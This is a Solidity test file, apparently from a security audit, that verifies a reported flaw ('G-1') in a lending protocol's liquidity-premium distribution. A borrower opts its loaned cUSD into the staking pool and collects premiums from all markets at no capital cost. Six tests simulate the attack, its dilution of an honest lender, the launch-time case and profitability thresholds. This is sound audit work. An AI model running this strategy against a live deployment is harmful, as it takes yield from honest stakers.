// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { CapDeployer } from "../../../../../../test/shared/CapDeployer.sol";

/// Adversarial verification of G-1 (P8): a borrower that parks its loan opted-in on cUSD earns a
/// share of the WHOLE liquidity-premium pot (all markets) and can net a profit with no capital.
///
/// Independent of the author's single-market PoC: three floating markets, each with its own
/// borrower and its own tranche supplier, an honest reserve-backed lender that opts in, and the
/// attacker on a third market. A year is run with a `chargePremium` on every market every 30 days
/// and monthly claims (so both the lender's and the attacker's stake compound). The attacker's
/// claimed premium is compared with the growth of the attacker's own debt, and the attacker then
/// repays its whole debt out of what it holds - the cleanest on-chain statement of "no capital".
contract G1_Verify is CapDeployer {
    address lender = makeAddr("lender");
    address seed = makeAddr("wrapperSeed");
    address b1 = makeAddr("borrower1");
    address b2 = makeAddr("borrower2");
    address atk = makeAddr("attacker");
    address uw1 = makeAddr("uwSupplier1");
    address uw2 = makeAddr("uwSupplier2");
    address uw3 = makeAddr("uwSupplier3");

    MarketBundle m1;
    MarketBundle m2;
    MarketBundle m3;

    uint256 constant OTHER_DEBT = 40_000_000e18; // per other borrower -> C_others = 80M
    uint256 constant D = 5_000_000e18;

    // ── setup ─────────────────────────────────────────────────────────────

    function _deploy(uint256 uwRate) internal {
        CapConfig memory cfg = _defaultCapConfig();
        cfg.applyLiquiditySlopes = true; // base 5%, slope0 5%, slope1 10%, kink 80%
        cfg.defaultFixedCreditLimit = 200_000_000e18;
        cfg.defaultUnderwriterRate = uwRate;
        _deployCapWithConfig(cfg);
        m1 = _mk("m1", b1, uw1, 3 * OTHER_DEBT);
        m2 = _mk("m2", b2, uw2, 3 * OTHER_DEBT);
        m3 = _mk("m3", atk, uw3, 30_000_000e18);
    }

    function _mk(string memory name, address borrower, address supplier, uint256 capital)
        internal
        returns (MarketBundle memory b)
    {
        b = _createMarketBundle(name, defaultMarketOwner, borrower);
        _configureMarketRates(b.market);
        _fundTranche(b.tranche0Addr, supplier, capital);
    }

    function _borrow(MarketBundle memory b, address who, uint256 amount) internal {
        vm.prank(who);
        b.market.borrow(who, amount);
    }

    function _optIn(address who) internal {
        vm.prank(who);
        stablecoin.optIn();
    }

    function _chargeAll() internal {
        m1.market.chargePremium();
        m2.market.chargePremium();
        m3.market.chargePremium();
    }

    function _claim(address who) internal returns (uint256 got) {
        vm.prank(who);
        got = stablecoin.claim(who);
    }

    /// 365 days: charge every market every 30 days (+5 at the end), claim after every charge.
    /// Returns the total claimed by each account and the attacker's debt at the last charge.
    function _year(address[] memory claimers) internal returns (uint256[] memory claimed, uint256 atkDebt) {
        claimed = new uint256[](claimers.length);
        for (uint256 i; i < 13; ++i) {
            vm.warp(block.timestamp + (i < 12 ? 30 days : 5 days));
            _chargeAll();
            for (uint256 j; j < claimers.length; ++j) {
                claimed[j] += _claim(claimers[j]);
            }
        }
        atkDebt = m3.market.totalDebt();
        // let the last pot vest (12h time constant), without charging more premium
        vm.warp(block.timestamp + 3 days);
        for (uint256 j; j < claimers.length; ++j) {
            claimed[j] += _claim(claimers[j]);
        }
    }

    function _two(address a, address b) internal pure returns (address[] memory arr) {
        arr = new address[](2);
        arr[0] = a;
        arr[1] = b;
    }

    function _one(address a) internal pure returns (address[] memory arr) {
        arr = new address[](1);
        arr[0] = a;
    }

    function _logState(string memory tag) internal {
        (uint256 credit, uint256 supply) = stablecoin.supplies();
        emit log_string(tag);
        emit log_named_decimal_uint("  credit-backed supply C", credit, 18);
        emit log_named_decimal_uint("  total supply S        ", supply, 18);
        emit log_named_decimal_uint("  opted-in stake        ", stablecoin.stakedSupply(), 18);
        emit log_named_decimal_uint("  utilization (ray)     ", stablecoin.utilizationRate(), 27);
        emit log_named_decimal_uint("  liquidity rate (ray)  ", irm.liquidityRate(), 27);
    }

    /// The attack as stated: borrow D, opt in, hold, run a year, then repay everything from holdings.
    function _runAttack(uint256 stakedW) internal returns (uint256 atkClaimed, uint256 growth, uint256 lenderClaimed) {
        _borrow(m3, atk, D);
        _optIn(atk);
        _logState("state after attacker borrows and opts in");

        (uint256[] memory claimed, uint256 atkDebt) = _year(_two(atk, lender));
        atkClaimed = claimed[0];
        lenderClaimed = claimed[1];
        growth = atkDebt - D;

        emit log_named_decimal_uint("attacker debt after 1y          ", atkDebt, 18);
        emit log_named_decimal_uint("attacker debt growth (liq + uw) ", growth, 18);
        emit log_named_decimal_uint("attacker premium claimed        ", atkClaimed, 18);
        if (atkClaimed >= growth) {
            emit log_named_decimal_uint("attacker NET PROFIT             ", atkClaimed - growth, 18);
        } else {
            emit log_named_decimal_uint("attacker NET COST               ", growth - atkClaimed, 18);
        }
        emit log_named_decimal_uint("lender premium claimed          ", lenderClaimed, 18);
        if (stakedW > 0) {
            emit log_named_decimal_uint("lender yield on stake (ray)     ", lenderClaimed * 1e27 / stakedW, 27);
        }

        // full repay out of what the attacker holds: D + claimed premium, nothing else
        uint256 held = stablecoin.balanceOf(atk);
        uint256 owed = m3.market.totalDebt();
        emit log_named_decimal_uint("attacker holds before repay     ", held, 18);
        emit log_named_decimal_uint("attacker owes before repay      ", owed, 18);
        if (held >= owed) {
            vm.prank(atk);
            m3.market.repay(type(uint256).max);
            emit log_named_decimal_uint(
                "attacker cUSD left after FULL repay (pure profit, zero capital)", stablecoin.balanceOf(atk), 18
            );
            assertEq(m3.market.totalDebt(), 0, "fully repaid");
        } else {
            emit log_named_decimal_uint("attacker SHORTFALL to repay (needs own capital)", owed - held, 18);
        }
    }

    // ── A. the author's scenario: S=100M, C=80M, W=20M, D=5M, uw 20% ───────

    function test_verify_A_authorScenario_u80_uw20_attackerProfits() public {
        _deploy(0.2e27);
        _depositStable(lender, 20_000_000e18);
        _optIn(lender);
        _borrow(m1, b1, OTHER_DEBT);
        _borrow(m2, b2, OTHER_DEBT);
        _logState("state before attack (S=100M, C=80M, W=20M)");

        (uint256 atkClaimed, uint256 growth,) = _runAttack(20_000_000e18);
        assertGt(atkClaimed, growth, "attacker nets a profit: claimed premium exceeds its own debt growth");
    }

    // ── B. dilution: what the honest staker loses, with vs without the attacker ──

    function test_verify_B_dilution_lenderLosesYieldButKeepsAtLeastBorrowRate() public {
        _deploy(0.2e27);
        _depositStable(lender, 20_000_000e18);
        _optIn(lender);
        _borrow(m1, b1, OTHER_DEBT);
        _borrow(m2, b2, OTHER_DEBT);

        uint256 snap = vm.snapshotState();
        (uint256[] memory alone,) = _year(_one(lender));
        emit log_named_decimal_uint("lender claimed, NO attacker     ", alone[0], 18);
        emit log_named_decimal_uint("lender yield, NO attacker (ray) ", alone[0] * 1e27 / 20_000_000e18, 27);
        vm.revertToState(snap);

        (uint256 atkClaimed, uint256 growth, uint256 withAtk) = _runAttack(20_000_000e18);
        emit log_named_decimal_uint("lender loss from dilution       ", alone[0] - withAtk, 18);
        emit log_named_decimal_uint("attacker gross capture          ", atkClaimed, 18);
        emit log_named_decimal_uint("attacker own premium paid       ", growth, 18);

        assertLt(withAtk, alone[0], "lender is diluted");
        // stakers never fall below the liquidity rate itself: r(u) ~ 10.5%..12% over the year on 20M
        assertGt(withAtk, 20_000_000e18 * 10 / 100, "lender still earns at least the borrow liquidity rate");
        // and the lender is not touched in principal
        assertGe(stablecoin.balanceOf(lender), 20_000_000e18, "lender principal intact");
    }

    // ── C. launch: only the Wrapper seed (1 cUSD) is opted in ───────────────

    function test_verify_C_launch_onlyWrapperSeedOptedIn_attackerTakesWholePot() public {
        _deploy(0.2e27);
        _depositStable(lender, 20_000_000e18); // reserve-backed float that has NOT opted in
        _depositStable(seed, 1e18); // DeployInfra WRAPPER_SEED = 1e18, opted in via Wrapper.initialize
        _optIn(seed);
        _borrow(m1, b1, OTHER_DEBT);
        _borrow(m2, b2, OTHER_DEBT);
        _logState("state before attack (launch: W = 1 cUSD)");

        // a much smaller loan than the author's: 1M against 80M of other credit
        vm.prank(atk);
        m3.market.borrow(atk, 1_000_000e18);
        _optIn(atk);

        (uint256[] memory claimed, uint256 atkDebt) = _year(_two(atk, seed));
        uint256 growth = atkDebt - 1_000_000e18;
        emit log_named_decimal_uint("attacker debt growth on 1M      ", growth, 18);
        emit log_named_decimal_uint("attacker premium claimed        ", claimed[0], 18);
        emit log_named_decimal_uint("seed premium claimed            ", claimed[1], 18);
        emit log_named_decimal_uint("attacker NET PROFIT             ", claimed[0] - growth, 18);
        assertGt(claimed[0], 5 * growth, "attacker captures many times its own cost at launch");
    }

    // ── D. above the threshold: W=40M (staked/S ~ 37.5% > phi* ~ 27%) ────────

    function test_verify_D_aboveThreshold_uw20_attackerLoses() public {
        _deploy(0.2e27);
        _depositStable(lender, 40_000_000e18);
        _optIn(lender);
        _borrow(m1, b1, OTHER_DEBT);
        _borrow(m2, b2, OTHER_DEBT);
        _logState("state before attack (S=120M, C=80M, W=40M)");

        (uint256 atkClaimed, uint256 growth,) = _runAttack(40_000_000e18);
        assertLt(atkClaimed, growth, "above phi* the loop is negative carry");
    }

    // ── E. same W=40M but a realistic underwriter rate of 5%: profitable again ──

    function test_verify_E_aboveThreshold_uw5_attackerProfits() public {
        _deploy(0.05e27);
        _depositStable(lender, 40_000_000e18);
        _optIn(lender);
        _borrow(m1, b1, OTHER_DEBT);
        _borrow(m2, b2, OTHER_DEBT);
        _logState("state before attack (S=120M, C=80M, W=40M, uw 5%)");

        (uint256 atkClaimed, uint256 growth,) = _runAttack(40_000_000e18);
        assertGt(atkClaimed, growth, "with uw 5% the threshold widens to ~50% and W=40M is still below it");
    }

    // ── F. the same excess is available to a capital staker with no borrower role ──

    function test_verify_F_capitalStakerEarnsTheSameShareWithoutBorrowing() public {
        _deploy(0.2e27);
        _depositStable(lender, 20_000_000e18);
        _optIn(lender);
        _borrow(m1, b1, OTHER_DEBT);
        _borrow(m2, b2, OTHER_DEBT);

        // a plain holder brings 5M of USDC instead of borrowing 5M
        address whale = makeAddr("capitalStaker");
        _depositStable(whale, D);
        _optIn(whale);
        _logState("state after capital staker deposits 5M and opts in");

        (uint256[] memory claimed,) = _year(_two(whale, lender));
        emit log_named_decimal_uint("capital staker claimed on 5M    ", claimed[0], 18);
        emit log_named_decimal_uint("capital staker yield (ray)      ", claimed[0] * 1e27 / D, 27);
        emit log_named_decimal_uint("lender claimed on 20M           ", claimed[1], 18);
        // yield per staked cUSD far above the borrow liquidity rate (~10%): the excess exists
        // for any opted-in holder; the borrower role only removes the capital requirement
        assertGt(claimed[0], D * 25 / 100, "capital staker earns > 25% on 5M");
    }
}
